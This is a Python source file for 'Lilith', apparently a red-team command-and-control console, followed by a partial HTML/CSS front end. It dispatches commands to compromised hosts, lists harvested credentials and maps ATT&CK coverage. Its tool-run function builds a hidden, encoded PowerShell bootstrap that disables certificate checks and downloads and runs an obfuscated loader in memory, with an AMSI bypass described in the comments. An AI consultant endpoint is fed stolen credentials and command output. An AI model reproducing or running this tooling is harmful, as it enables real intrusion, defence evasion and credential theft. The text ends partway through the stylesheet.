"""
server/ui.py — Lilith engagement console.

GET  /ui/                              → HTML SPA
GET  /ui/api/summary                   → aggregate stats
GET  /ui/api/sessions                  → DB session list
GET  /ui/api/session/<id>              → session detail (tasks+results)
GET  /ui/api/credentials               → credential findings
GET  /ui/api/techniques                → ATT&CK coverage
GET  /ui/api/events                    → event log
GET  /ui/api/export/json               → full JSON dump
GET  /ui/api/export/markdown           → Markdown report
POST /ui/api/sessions/<id>/label       → set label/note
GET  /ui/api/c2/sessions              → live C2 session registry
POST /ui/api/c2/<sid>/task            → dispatch command → {task_id}
GET  /ui/api/c2/<sid>/result/<tid>    → 200+output | 204 pending
DELETE /ui/api/c2/<sid>              → kill session
GET  /ui/api/arsenal                  → workspace file listing
GET  /ui/api/stream                   → SSE (handled directly in https_server.py)
"""

import hashlib
import json
import os
import re
import time as _time

_workspace = ""
_STARTUP = _time.time()

def set_workspace(path: str) -> None:
    global _workspace
    _workspace = path

def _srv():
    import server.https_server as m
    return m

# ── ATT&CK metadata ───────────────────────────────────────────────────────────

TACTIC_ORDER = [
    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
    "Credential Access", "Discovery", "Lateral Movement",
    "Collection", "Command and Control", "Exfiltration",
]

TECH_META: dict[str, dict] = {
    "T1059.001": {"name": "PowerShell",            "tactic": "Execution"},
    "T1059.003": {"name": "Windows Cmd Shell",     "tactic": "Execution"},
    "T1546.003": {"name": "WMI Event Sub",         "tactic": "Persistence"},
    "T1546.015": {"name": "COM Hijacking",         "tactic": "Persistence"},
    "T1547.001": {"name": "Registry Run Key",      "tactic": "Persistence"},
    "T1053.005": {"name": "Scheduled Task",        "tactic": "Persistence"},
    "T1068":     {"name": "Exploit for PE",        "tactic": "Privilege Escalation"},
    "T1134":     {"name": "Token Manipulation",    "tactic": "Privilege Escalation"},
    "T1134.001": {"name": "SeImpersonate Abuse",   "tactic": "Privilege Escalation"},
    "T1055":     {"name": "Process Injection",     "tactic": "Defense Evasion"},
    "T1055.015": {"name": "Inject (ListPlanting)", "tactic": "Defense Evasion"},
    "T1003":     {"name": "Credential Dumping",    "tactic": "Credential Access"},
    "T1558":     {"name": "Kerberos Tickets",      "tactic": "Credential Access"},
    "T1649":     {"name": "Shadow Credentials",    "tactic": "Credential Access"},
    "T1555":     {"name": "Password Stores",       "tactic": "Credential Access"},
    "T1555.003": {"name": "Chrome Creds",          "tactic": "Credential Access"},
    "T1033":     {"name": "User Discovery",          "tactic": "Discovery"},
    "T1082":     {"name": "System Info",             "tactic": "Discovery"},
    "T1087":     {"name": "Account Discovery",       "tactic": "Discovery"},
    "T1087.002": {"name": "Domain Accounts",         "tactic": "Discovery"},
    "T1069.001": {"name": "Local Groups",            "tactic": "Discovery"},
    "T1069.002": {"name": "Domain Groups",           "tactic": "Discovery"},
    "T1016":     {"name": "Network Config",          "tactic": "Discovery"},
    "T1057":     {"name": "Process Discovery",       "tactic": "Discovery"},
    "T1049":     {"name": "Network Connections",     "tactic": "Discovery"},
    "T1083":     {"name": "File Discovery",          "tactic": "Discovery"},
    "T1012":     {"name": "Query Registry",          "tactic": "Discovery"},
    "T1018":     {"name": "Remote Sys Discovery",    "tactic": "Discovery"},
    "T1482":     {"name": "Domain Trust",            "tactic": "Discovery"},
    # Credential Access — Kerberos
    "T1558.001": {"name": "Golden Ticket",           "tactic": "Credential Access"},
    "T1558.002": {"name": "Silver Ticket",           "tactic": "Credential Access"},
    "T1558.003": {"name": "Kerberoasting",           "tactic": "Credential Access"},
    "T1558.004": {"name": "AS-REP Roasting",         "tactic": "Credential Access"},
    # Credential Access — Dumping
    "T1003.001": {"name": "LSASS Memory",            "tactic": "Credential Access"},
    "T1003.002": {"name": "SAM Dump",                "tactic": "Credential Access"},
    "T1003.006": {"name": "DCSync",                  "tactic": "Credential Access"},
    # Defense Evasion / Lateral
    "T1550.003": {"name": "Pass the Ticket",         "tactic": "Defense Evasion"},
    "T1021.002": {"name": "SMB/Windows Admin Shares","tactic": "Lateral Movement"},
    "T1021.006": {"name": "WMI Lateral Movement",   "tactic": "Lateral Movement"},
    "T1021":     {"name": "Remote Services",         "tactic": "Lateral Movement"},
    "T1090":     {"name": "Proxy",                   "tactic": "Lateral Movement"},
    "T1090.003": {"name": "Multi-hop Proxy",         "tactic": "Lateral Movement"},
    "T1039":     {"name": "File Share Collection",   "tactic": "Collection"},
    "T1113":     {"name": "Screen Capture",          "tactic": "Collection"},
    "T1041":     {"name": "Exfil over C2",           "tactic": "Exfiltration"},
    "T1105":     {"name": "Ingress Tool Transfer",   "tactic": "Command and Control"},
    "T1557.001": {"name": "LLMNR/NTLM Relay",       "tactic": "Credential Access"},
    "T1505.001": {"name": "SQL Stored Procedures",   "tactic": "Execution"},
    "T1134.002": {"name": "Create Process w/Token",  "tactic": "Privilege Escalation"},
}

# ── API helpers ───────────────────────────────────────────────────────────────

def _j(data, status: int = 200) -> tuple:
    return status, "application/json", json.dumps(data, default=str).encode()

def _api_summary(db) -> dict:
    sessions = db.get_sessions()
    tasks    = db.get_tasks()
    events   = db.get_events()
    creds    = db.get_cred_results()
    covered: dict[str, int] = {}
    for t in tasks:
        tid = t.get("technique_id") or ""
        if tid:
            covered[tid] = covered.get(tid, 0) + 1
    top = sorted(covered.items(), key=lambda x: -x[1])[:5]
    return {
        "session_count":           len(sessions),
        "task_count":              len(tasks),
        "cred_count":              len(creds),
        "event_count":             len(events),
        "covered_technique_count": len(covered),
        "total_technique_count":   len(TECH_META),
        "top_techniques":          [{"tid": k, "count": v, "name": TECH_META.get(k, {}).get("name", k)} for k, v in top],
        "recent_events":           sorted(events, key=lambda e: e.get("at", ""))[-20:][::-1],
    }

def _api_session(db, session_id: str) -> dict:
    sessions = [s for s in db.get_sessions() if s["id"] == session_id]
    if not sessions:
        return {}
    tasks   = db.get_tasks(session_id)
    results = db.get_results_for_session(session_id)
    events  = db.get_events(session_id)
    rmap    = {r["task_id"]: r for r in results}
    for t in tasks:
        r = rmap.get(t["id"]) or {}
        t["output"]    = r.get("output")
        t["has_creds"] = r.get("has_creds", 0)
        hints = r.get("cred_hints")
        try:
            t["cred_hints"] = json.loads(hints) if hints else []
        except Exception:
            t["cred_hints"] = []
    return {"session": sessions[0], "tasks": tasks, "events": events}

def _api_credentials(db) -> list:
    rows = db.get_cred_results()
    for r in rows:
        hints = r.get("cred_hints")
        try:
            r["cred_hints"] = json.loads(hints) if hints else []
        except Exception:
            r["cred_hints"] = []
    return rows

def _api_techniques(db) -> dict:
    tasks = db.get_tasks()
    covered: dict[str, list] = {}
    for t in tasks:
        tid = t.get("technique_id") or ""
        sid = t.get("session_id") or ""
        if tid:
            if tid not in covered:
                covered[tid] = []
            if sid and sid not in covered[tid]:
                covered[tid].append(sid)
    return {"all_techniques": TECH_META, "tactic_order": TACTIC_ORDER, "covered": covered}

def _label_session(db, session_id: str, body: bytes) -> dict:
    try:
        data = json.loads(body or b"{}")
    except Exception:
        data = {}
    label = str(data.get("label", "")).strip()[:64]
    note  = str(data.get("note",  "")).strip()[:512]
    return {"ok": db.tag_session(session_id, label, note or None)}

def _api_c2_sessions() -> dict:
    return _srv().get_c2_sessions()

def _api_c2_task(session_id: str, body: bytes) -> tuple:
    try:
        cmd = json.loads(body or b"{}").get("cmd", "").strip()
    except Exception:
        cmd = ""
    if not cmd:
        return _j({"error": "empty command"}, 400)
    task_id = _srv()._c2_push_task(session_id, cmd)
    if task_id is None:
        return _j({"error": "session not found"}, 404)
    _srv()._sse_publish({"type": "task_queued", "task_id": task_id, "session_id": session_id, "cmd": cmd})
    return _j({"task_id": task_id})

def _api_c2_result(session_id: str, task_id: str) -> tuple:
    output = _srv()._c2_get_result(session_id, task_id)
    if output is None:
        return 204, "application/json", b""
    return 200, "text/plain; charset=utf-8", output.encode()

def _api_c2_kill(session_id: str) -> tuple:
    ok = _srv()._c2_kill_session(session_id)
    if ok:
        _srv()._sse_publish({"type": "session_killed", "id": session_id})
    return _j({"ok": ok})

def _api_arsenal() -> dict:
    if not _workspace or not os.path.isdir(_workspace):
        return {"workspace": _workspace, "files": []}
    files = []
    for fname in sorted(os.listdir(_workspace)):
        fpath = os.path.join(_workspace, fname)
        if os.path.isfile(fpath):
            files.append({"name": fname, "size": os.path.getsize(fpath),
                          "ext": os.path.splitext(fname)[1].lower()})
    return {"workspace": _workspace, "files": files}

# ── Arsenal tool catalog ─────────────────────────────────────────────────────

def _read_manifest() -> dict:
    p = os.path.join(_workspace, "manifest.json")
    try:
        with open(p) as f:
            return json.load(f)
    except Exception:
        return {}

def _write_manifest(data: dict) -> None:
    with open(os.path.join(_workspace, "manifest.json"), "w") as f:
        json.dump(data, f, indent=2)

def _api_arsenal_tools() -> dict:
    from builders.encoder import TOOL_CATALOG, find_tool
    manifest = _read_manifest()
    tools = []
    for name, entry in TOOL_CATALOG.items():
        enc_name = manifest.get(f"enc_{name}")
        meta     = manifest.get(f"meta_{name}", {})
        built    = bool(enc_name and os.path.exists(os.path.join(_workspace, enc_name)))
        tools.append({
            "name":             name,
            "desc":             entry.get("desc", ""),
            "default_params":   entry.get("default_params", ""),
            "lhost_placeholder": entry.get("lhost_placeholder", False),
            "binary_found":     bool(find_tool(name)),
            "built":            built,
            "enc_name":         enc_name if built else None,
            "clr":              meta.get("clr", False),
            "args":             meta.get("args") or entry.get("default_params", ""),
        })
    return {"tools": tools}

def _api_arsenal_run(body: bytes) -> tuple:
    import base64 as _b64
    from builders.stager import build_tool_stager
    try:
        req = json.loads(body or b"{}")
    except Exception:
        return _j({"error": "bad json"}, 400)
    sid       = req.get("session_id", "")
    tool_name = req.get("tool_name", "")
    params    = req.get("params")   # None → use manifest default
    if not sid or not tool_name:
        return _j({"error": "session_id and tool_name required"}, 400)
    from builders.encoder import TOOL_CATALOG, find_tool, encode_tool, is_dotnet_assembly
    manifest = _read_manifest()
    enc_name = manifest.get(f"enc_{tool_name}")
    if not enc_name or not os.path.exists(os.path.join(_workspace, enc_name)):
        # Auto-encode on first run — no manual `lilith build --tool` needed
        binary_path = find_tool(tool_name)
        if not binary_path:
            return _j({"error": f"{tool_name} binary not found — copy to windows/{tool_name}.exe"}, 404)
        import secrets as _sec2
        enc_name  = f"{tool_name.lower()}_{_sec2.token_hex(4)}.enc"
        enc_path  = os.path.join(_workspace, enc_name)
        cat_entry = TOOL_CATALOG.get(tool_name, {})
        def_params = cat_entry.get("default_params", "")
        if not encode_tool(binary_path, def_params or None, enc_path):
            return _j({"error": f"failed to encode {tool_name} — is donut installed?"}, 500)
        clr = is_dotnet_assembly(binary_path)
        manifest[f"enc_{tool_name}"]  = enc_name
        manifest[f"meta_{tool_name}"] = {"clr": clr, "args": def_params}
        _write_manifest(manifest)
    meta = manifest.get(f"meta_{tool_name}", {})
    clr  = meta.get("clr", False)
    if params is None:
        params = meta.get("args", "")

    # Build stager PS1 and host it in workspace — same technique as initial access
    import secrets as _sec
    from builders.stager import _compact_exec_loader
    tool_url    = f"{_srv()._SERVER_BASE}/{enc_name}"
    ps1         = build_tool_stager(tool_url, clr, params or None)
    stager_name = f"_st_{_sec.token_hex(8)}.ps1"
    stager_path = os.path.join(_workspace, stager_name)
    with open(stager_path, "w", encoding="utf-8") as f:
        f.write(ps1)
    stager_url  = f"{_srv()._SERVER_BASE}/{stager_name}"

    # Host the compact loader as a separate PS1 file — the compact loader has ZWSP-obfuscated
    # AMSI bypass, so AMSI won't detect it when downloaded. The bootstrap is kept tiny (<400 chars
    # b64) to fit inside the agent's ~4KB command buffer; the full compact loader is hosted here.
    loader_lines = _compact_exec_loader(stager_url)
    loader_name  = f"_ld_{_sec.token_hex(8)}.ps1"
    loader_path  = os.path.join(_workspace, loader_name)
    with open(loader_path, "w", encoding="utf-8") as f:
        f.write("\n".join(loader_lines))
    loader_url = f"{_srv()._SERVER_BASE}/{loader_name}"

    # Bootstrap: explicit UTF-8 WebClient so ZWSP chars in the compact loader survive
    # DownloadString (default WebClient uses system OEM codepage, corrupting Unicode).
    # The compact loader then bypasses AMSI and fetches+invokes the stager in-memory.
    short_boot = (
        f"[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};"
        f"$__wc=New-Object Net.WebClient;"
        f"$__wc.Encoding=[Text.Encoding]::UTF8;"
        f"IEX($__wc.DownloadString('{loader_url}'))"
    )
    b64 = _b64.b64encode(short_boot.encode("utf-16-le")).decode()
    cmd = f"powershell -NonInteractive -WindowStyle Hidden -enc {b64}"

    task_id = _srv()._c2_push_task(sid, cmd)
    if task_id is None:
        os.unlink(stager_path)
        os.unlink(loader_path)
        return _j({"error": "session not found"}, 404)

    _srv()._sse_publish({
        "type": "task_queued", "task_id": task_id, "session_id": sid,
        "cmd": f"[TOOL] {tool_name} {params or ''}".strip(),
    })
    return _j({"task_id": task_id, "tool": tool_name})

# ── Payload versioning ────────────────────────────────────────────────────────

_SKIP_VERSION = {"payload_versions.json", "engagement_meta.json", "engagement.db",
                 "manifest.json", "server.crt", "server.key"}

def _versions_path() -> str:
    return os.path.join(_workspace, "payload_versions.json")

def _load_versions() -> dict:
    try:
        with open(_versions_path()) as f:
            return json.load(f)
    except Exception:
        return {}

def _save_versions(data: dict) -> None:
    with open(_versions_path(), "w") as f:
        json.dump(data, f, indent=2, default=str)

def _sha256_short(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()[:16]

def _api_arsenal_versions() -> dict:
    if not _workspace:
        return {}
    return _load_versions()

def _api_arsenal_snapshot() -> dict:
    if not _workspace or not os.path.isdir(_workspace):
        return {"snapped": 0}
    versions = _load_versions()
    snapped  = 0
    now      = __import__("datetime").datetime.now().isoformat()
    for fname in sorted(os.listdir(_workspace)):
        if fname in _SKIP_VERSION:
            continue
        fpath = os.path.join(_workspace, fname)
        if not os.path.isfile(fpath):
            continue
        h    = _sha256_short(fpath)
        hist = versions.get(fname, [])
        if hist and hist[-1]["sha256"] == h:
            continue
        hist.append({"version": len(hist) + 1, "sha256": h,
                     "size": os.path.getsize(fpath), "built_at": now})
        versions[fname] = hist
        snapped += 1
    _save_versions(versions)
    return {"snapped": snapped}

# ── Admin panel ───────────────────────────────────────────────────────────────

def _api_admin_status() -> dict:
    srv = _srv()
    return {
        "uptime_s":     int(_time.time() - getattr(srv, "_START_TIME", _STARTUP)),
        "live_sessions": len(srv.get_c2_sessions()),
        "callbacks":     len(srv._EXFIL_LOG),
        "auth_enabled":  bool(srv._UI_TOKENS),
    }

def _api_admin_engagement_get() -> dict:
    if not _workspace:
        return {}
    try:
        with open(os.path.join(_workspace, "engagement_meta.json")) as f:
            return json.load(f)
    except Exception:
        return {}

def _api_admin_engagement_save(body: bytes) -> dict:
    try:
        data = json.loads(body or b"{}")
    except Exception:
        return {"ok": False}
    allowed = {"name", "client", "scope", "assessor", "start_date", "end_date", "notes"}
    clean = {k: str(v)[:512] for k, v in data.items() if k in allowed}
    with open(os.path.join(_workspace, "engagement_meta.json"), "w") as f:
        json.dump(clean, f, indent=2)
    return {"ok": True}

# ── Astaroth AI consultant ────────────────────────────────────────────────────

def _api_astaroth(body: bytes, db) -> tuple:
    try:
        req = json.loads(body or b"{}")
    except Exception:
        return _j({"error": "bad json"}, 400)

    question = str(req.get("question", "")).strip()[:2000]
    if not question:
        return _j({"error": "empty question"}, 400)

    sid = req.get("session_id", "")

    # Build context from live + DB
    context: dict = {}

    # Engagement meta (objective, scope, client) — always included if available
    try:
        with open(os.path.join(_workspace, "engagement_meta.json")) as _f:
            context["engagement"] = json.load(_f)
    except Exception:
        pass

    if sid:
        sessions = [s for s in db.get_sessions() if s["id"] == sid]
        if sessions:
            context["session"] = sessions[0]
        live = _srv().get_c2_sessions()
        context["live"] = live.get(sid)
        tasks   = db.get_tasks(sid)
        results = db.get_results_for_session(sid)
        rmap    = {r["task_id"]: r for r in results}
        outputs = []
        for t in tasks:
            r = rmap.get(t["id"]) or {}
            out = r.get("output")
            if t.get("command") and out:
                outputs.append({"command": t["command"], "output": out})
        context["recent_outputs"] = outputs[-6:]
        cred_tasks = [t for t in tasks if rmap.get(t["id"], {}).get("has_creds")]
        creds = []
        for t in cred_tasks:
            try:
                hints = json.loads(rmap[t["id"]].get("cred_hints") or "[]")
                creds.extend(hints)
            except Exception:
                pass
        context["credentials"] = creds
        techs = list({t.get("technique_id") for t in tasks if t.get("technique_id")})
        context["techniques"] = techs

    import threading, secrets as _sec
    from server.astaroth import consult_stream
    stream_id = _sec.token_hex(8)

    def _run():
        consult_stream(question, context, stream_id, _srv()._sse_publish)

    threading.Thread(target=_run, daemon=True).start()
    return _j({"stream_id": stream_id})

# ── Router ────────────────────────────────────────────────────────────────────

def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
    path = path.split("?")[0]

    if method == "GET":
        if path in ("/ui", "/ui/"):
            return 200, "text/html; charset=utf-8", _UI_HTML.encode()
        if path == "/ui/api/summary":
            return _j(_api_summary(db))
        if path == "/ui/api/sessions":
            return _j(db.get_sessions())
        m = re.fullmatch(r"/ui/api/session/([^/]+)", path)
        if m:
            return _j(_api_session(db, m.group(1)))
        if path == "/ui/api/credentials":
            return _j(_api_credentials(db))
        if path == "/ui/api/techniques":
            return _j(_api_techniques(db))
        if path == "/ui/api/events":
            return _j(db.get_events())
        if path == "/ui/api/export/json":
            return 200, "application/json", json.dumps(db.export_json(), indent=2, default=str).encode()
        if path == "/ui/api/export/markdown":
            return 200, "text/markdown; charset=utf-8", db.export_markdown().encode()
        if path == "/ui/api/c2/sessions":
            return _j(_api_c2_sessions())
        m = re.fullmatch(r"/ui/api/c2/([^/]+)/result/([^/]+)", path)
        if m:
            return _api_c2_result(m.group(1), m.group(2))
        if path == "/ui/api/arsenal":
            return _j(_api_arsenal())
        if path == "/ui/api/arsenal/tools":
            return _j(_api_arsenal_tools())
        if path == "/ui/api/arsenal/versions":
            return _j(_api_arsenal_versions())
        if path == "/ui/api/admin/status":
            return _j(_api_admin_status())
        if path == "/ui/api/admin/engagement":
            return _j(_api_admin_engagement_get())

    if method == "POST":
        if path == "/ui/api/astaroth/consult":
            return _api_astaroth(body, db)

        m = re.fullmatch(r"/ui/api/sessions/([^/]+)/label", path)
        if m:
            return _j(_label_session(db, m.group(1), body))
        m = re.fullmatch(r"/ui/api/c2/([^/]+)/task", path)
        if m:
            return _api_c2_task(m.group(1), body)
        if path == "/ui/api/arsenal/snapshot":
            return _j(_api_arsenal_snapshot())
        if path == "/ui/api/arsenal/run":
            return _api_arsenal_run(body)
        if path == "/ui/api/admin/engagement":
            return _j(_api_admin_engagement_save(body))

    if method == "DELETE":
        m = re.fullmatch(r"/ui/api/c2/([^/]+)", path)
        if m:
            return _api_c2_kill(m.group(1))
        m = re.fullmatch(r"/ui/api/sessions/([^/]+)", path)
        if m:
            sid = m.group(1)
            if db:
                db.delete_session(sid)
            return _j({"deleted": sid})

    return 404, "application/json", b'{"error":"not found"}'


# ── HTML SPA ──────────────────────────────────────────────────────────────────

_UI_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>LILITH // C2</title>
<style>
:root {
  --bg:      #060606;
  --surf:    #0d0d0d;
  --surf2:   #111111;
  --surf3:   #181818;
  --border:  #1a1a1a;
  --bord2:   #252525;
  --red:     #c81e1e;
  --red2:    #ef4444;
  --red3:    rgba(200,30,30,.18);
  --red4:    rgba(200,30,30,.07);
  --text:    #cccccc;
  --dim:     #555555;
  --dim2:    #777777;
  --green:   #16a34a;
  --glow:    #4ade80;
  --yellow:  #ca8a04;
  --amber:   #fbbf24;
  --mono:    'Cascadia Code','Consolas','JetBrains Mono',monospace;
}
*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
html,body { height:100%; background:var(--bg); color:var(--text); font:12px/1.5 var(--mono); overflow:hidden; }

/* ── top bar ── */
#topbar {
  height:38px; display:flex; align-items:center; gap:0;
  background:var(--surf); border-bottom:1px solid var(--border);
  flex-shrink:0; overflow:hidden;
}
.logo {
  padding:0 16px; font-size:13px; font-weight:700; color:var(--red2);
  letter-spacing:.05em; border-right:1px solid var(--border); height:100%;
  display:flex; align-items:center; gap:6px; flex-shrink:0;
}
.logo span { color:var(--dim2); font-weight:400; }
#topnav { display:flex; height:100%; }
.tnav {
  padding:0 14px; height:100%; display:flex; align-items:center;
  font-size:10px; letter-spacing:.12em; color:var(--dim2); cursor:pointer;
  border-right:1px solid var(--border); border-bottom:2px solid transparent;
  transition:all .1s; user-select:none;
}
.tnav:hover { color:var(--text); background:var(--surf3); }
.tnav.active { color:var(--red2); border-bottom-color:var(--red); }
#topbar-right {
  margin-left:auto; display:flex; align-items:center; gap:12px;
  padding:0 14px; font-size:10px; color:var(--dim);
}
#live-pill {
  display:flex; align-items:center; gap:5px; padding:2px 8px;
  border:1px solid var(--border); border-radius:10px;
}
#ticker {
  max-width:340px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
  color:var(--dim); font-size:10px;
}
#ticker.flash { color:var(--amber); }
#ts { color:var(--dim); font-size:10px; flex-shrink:0; }

/* ── main layout ── */
#app { display:flex; flex-direction:column; height:100vh; }
#body { display:flex; flex:1; overflow:hidden; }

/* ── session sidebar ── */
#sess-sidebar {
  width:220px; min-width:220px; background:var(--surf);
  border-right:1px solid var(--border); display:flex; flex-direction:column;
  overflow:hidden;
}
#sess-sidebar-hdr {
  padding:8px 12px; font-size:9px; letter-spacing:.12em; color:var(--dim);
  border-bottom:1px solid var(--border); display:flex; justify-content:space-between;
  align-items:center; flex-shrink:0;
}
#sess-list { flex:1; overflow-y:auto; }
.sess-item {
  padding:8px 12px; cursor:pointer; border-bottom:1px solid var(--border);
  border-left:2px solid transparent; transition:all .1s;
}
.sess-item:hover { background:var(--surf3); }
.sess-item.active { border-left-color:var(--red); background:var(--red4); }
.sess-item-id { font-size:10px; color:var(--dim2); margin-bottom:2px; }
.sess-item-host { font-size:11px; color:var(--text); }
.sess-item-meta { display:flex; align-items:center; gap:6px; margin-top:3px; }
.sess-del { margin-left:auto; background:none; border:none; color:var(--dim); cursor:pointer;
            font-size:13px; line-height:1; padding:0 2px; }
.sess-del:hover { color:var(--red2); }
.sess-empty { padding:16px 12px; font-size:11px; color:var(--dim); text-align:center; }

/* ── main panel ── */
#main { flex:1; overflow:hidden; display:flex; flex-direction:column; }

/* ── global views (Arsenal, ATT&CK, Report) ── */
.gview { display:none; flex:1; overflow:auto; }
.gview.active { display:flex; flex-direction:column; }
.gview-hdr {
  padding:14px 20px 10px; border-bottom:1px solid var(--border);
  display:flex; justify-content:space-between; align-items:center; flex-shrink:0;
}
.gview-title { font-size:10px; letter-spacing:.15em; color:var(--dim2); }
.gview-title strong { display:block; font-size:14px; color:var(--red2); margin-top:2px; letter-spacing:.04em; }
.gview-body { flex:1; overflow:auto; padding:18px 20px; }

/* ── ops view (session-centric) ── */
#ops-view { display:flex; flex:1; overflow:hidden; }
#ops-view.hidden { display:none; }
#sess-detail { flex:1; overflow:hidden; display:flex; flex-direction:column; }
#no-session {
  flex:1; display:flex; align-items:center; justify-content:center;
  color:var(--dim); font-size:11px; flex-direction:column; gap:8px;
}
#no-session .big { font-size:32px; opacity:.2; }
#session-panel { flex:1; overflow:hidden; display:none; flex-direction:column; }

/* ── session header ── */
#sess-hdr {
  padding:10px 16px; background:var(--surf); border-bottom:1px solid var(--border);
  display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap;
}
#sess-hdr-host { font-size:14px; color:var(--text); font-weight:600; }
#sess-hdr-ip   { font-size:11px; color:var(--dim2); }
#sess-hdr-badges { display:flex; gap:6px; align-items:center; }
#sess-hdr-stats { margin-left:auto; display:flex; gap:12px; font-size:10px; color:var(--dim); }
.hdr-stat strong { color:var(--text); }
#sess-hdr-actions { display:flex; gap:6px; }

/* ── tabs ── */
#sess-tabs {
  display:flex; background:var(--surf2); border-bottom:1px solid var(--border); flex-shrink:0;
}
.stab {
  padding:7px 16px; font-size:10px; letter-spacing:.1em; color:var(--dim);
  cursor:pointer; border-bottom:2px solid transparent; transition:all .1s;
  display:flex; align-items:center; gap:5px; user-select:none;
}
.stab:hover { color:var(--text); }
.stab.active { color:var(--red2); border-bottom-color:var(--red); }
.tab-badge {
  background:var(--red3); color:var(--red2); border-radius:8px;
  padding:0 5px; font-size:9px; font-weight:700;
}

/* ── shell tab ── */
#tab-shell { flex:1; overflow:hidden; display:flex; flex-direction:column; }
.quick-bar {
  padding:6px 12px; background:var(--surf2); border-bottom:1px solid var(--border);
  display:flex; gap:4px; flex-wrap:wrap; align-items:center; flex-shrink:0;
}
.qlabel { font-size:9px; color:var(--dim); letter-spacing:.08em; margin-right:3px; }
.qbtn {
  padding:2px 7px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
  background:var(--surf3); color:var(--dim2); cursor:pointer; font-family:var(--mono);
  transition:all .1s;
}
.qbtn:hover { border-color:var(--red); color:var(--red2); }
#shell-out {
  flex:1; overflow-y:auto; padding:10px 14px;
  font:12px/1.65 var(--mono); background:var(--bg);
}
.sl { word-break:break-all; }
.sl-cmd-line { display:flex; gap:6px; margin-top:8px; margin-bottom:2px; }
.sl-prompt { color:var(--red); flex-shrink:0; }
.sl-cmd    { color:#e5e7eb; }
.sl-output { color:#9ca3af; white-space:pre-wrap; padding-left:2px; }
.sl-err    { color:#f87171; }
.sl-info   { color:var(--dim2); font-style:italic; }
.sl-pending { color:var(--amber); }
.sl-cred   { color:var(--glow); }
#shell-input-bar {
  display:flex; gap:8px; align-items:center;
  padding:8px 14px; background:var(--surf); border-top:1px solid var(--border); flex-shrink:0;
}
#shell-prompt-lbl { color:var(--red); flex-shrink:0; }
#shell-input {
  flex:1; background:transparent; border:none; outline:none;
  color:var(--text); font:12px var(--mono); caret-color:var(--red2);
}
#shell-input::placeholder { color:var(--dim); }

/* ── history tab ── */
#tab-history { flex:1; overflow:auto; display:none; padding:12px 16px; }
.hist-row {
  display:flex; gap:10px; align-items:flex-start; padding:7px 10px;
  background:var(--surf2); border:1px solid var(--border); border-radius:3px;
  margin-bottom:5px; cursor:pointer;
}
.hist-row:hover { border-color:var(--bord2); }
.hist-ts   { color:var(--dim); font-size:10px; flex-shrink:0; width:56px; }
.hist-cmd  { flex:1; color:var(--text); font-size:11px; }
.hist-status { flex-shrink:0; }
.hist-out { display:none; color:#9ca3af; font-size:11px; white-space:pre-wrap; word-break:break-all;
            margin-top:6px; padding-top:6px; border-top:1px solid var(--border); }
.hist-row.expanded .hist-out { display:block; }

/* ── creds tab ── */
#tab-creds { flex:1; overflow:auto; display:none; padding:12px 16px; }
.cred-card {
  background:var(--surf2); border:1px solid var(--border); border-radius:3px;
  padding:10px 12px; margin-bottom:8px;
}
.cred-card.fresh { border-color:var(--green); }
.cred-type  { font-size:9px; letter-spacing:.1em; color:var(--dim); margin-bottom:4px; }
.cred-value { font-size:12px; color:var(--glow); word-break:break-all; }
.cred-meta  { font-size:10px; color:var(--dim); margin-top:4px; }

/* ── info tab ── */
#tab-info { flex:1; overflow:auto; display:none; padding:12px 16px; }
.info-grid { display:grid; grid-template-columns:auto 1fr; gap:6px 16px; font-size:11px; margin-bottom:16px; }
.info-key { color:var(--dim); }
.info-val { color:var(--text); }

/* ── Arsenal ── */
.art-cat { font-size:9px; letter-spacing:.12em; color:var(--dim); margin:14px 0 6px; }
.art-cat:first-child { margin-top:0; }
.file-row {
  display:flex; align-items:center; gap:10px;
  padding:7px 10px; background:var(--surf2); border:1px solid var(--border);
  border-radius:3px; margin-bottom:3px;
}
.file-ext { font-size:9px; color:var(--red2); background:var(--red4);
            border:1px solid var(--red3); border-radius:2px; padding:1px 4px;
            flex-shrink:0; width:32px; text-align:center; }
.file-name { flex:1; color:var(--text); }
.file-size { color:var(--dim); font-size:10px; flex-shrink:0; width:60px; text-align:right; }
.cbtn {
  padding:2px 7px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
  background:var(--surf3); color:var(--dim2); cursor:pointer; font-family:var(--mono); flex-shrink:0;
}
.cbtn:hover { border-color:var(--red); color:var(--red2); }
.cbtn.ok { border-color:var(--green); color:var(--glow); }

/* ── ATT&CK ── */
.atk-grid { display:flex; gap:10px; flex-wrap:wrap; }
.atk-col  { flex:1; min-width:140px; }
.atk-tac  { font-size:9px; letter-spacing:.1em; color:var(--dim);
            padding:4px 0 3px; border-bottom:1px solid var(--border); margin-bottom:5px; }
.atk-tech {
  padding:4px 7px; margin-bottom:2px; border-radius:2px; font-size:10px;
  border:1px solid var(--border); background:var(--surf2);
}
.atk-tech.hit { background:var(--red3); border-color:var(--red); color:var(--red2); }
.atk-tid { font-size:9px; color:var(--dim); display:block; }

/* ── common ── */
.badge {
  display:inline-flex; align-items:center; gap:3px;
  padding:1px 6px; border-radius:2px; font-size:10px; font-weight:600;
}
.badge-alive  { background:rgba(22,163,74,.2);  color:var(--glow); }
.badge-stale  { background:rgba(202,138,4,.2);  color:var(--amber); }
.badge-dead   { background:rgba(100,100,100,.15); color:var(--dim2); }
.dot { display:inline-block; width:6px; height:6px; border-radius:50%; }
.dot-g { background:var(--glow); box-shadow:0 0 4px var(--glow); }
.dot-y { background:var(--amber); }
.dot-d { background:var(--dim); }
.btn {
  display:inline-flex; align-items:center; gap:4px;
  padding:4px 10px; border:1px solid var(--bord2); border-radius:2px;
  background:var(--surf3); color:var(--text); font:11px var(--mono);
  cursor:pointer; transition:all .1s; white-space:nowrap;
}
.btn:hover  { border-color:var(--dim2); }
.btn-red    { border-color:var(--red); color:var(--red2); }
.btn-red:hover { background:var(--red3); }
.btn-sm     { padding:2px 7px; font-size:10px; }
table { width:100%; border-collapse:collapse; font-size:11px; }
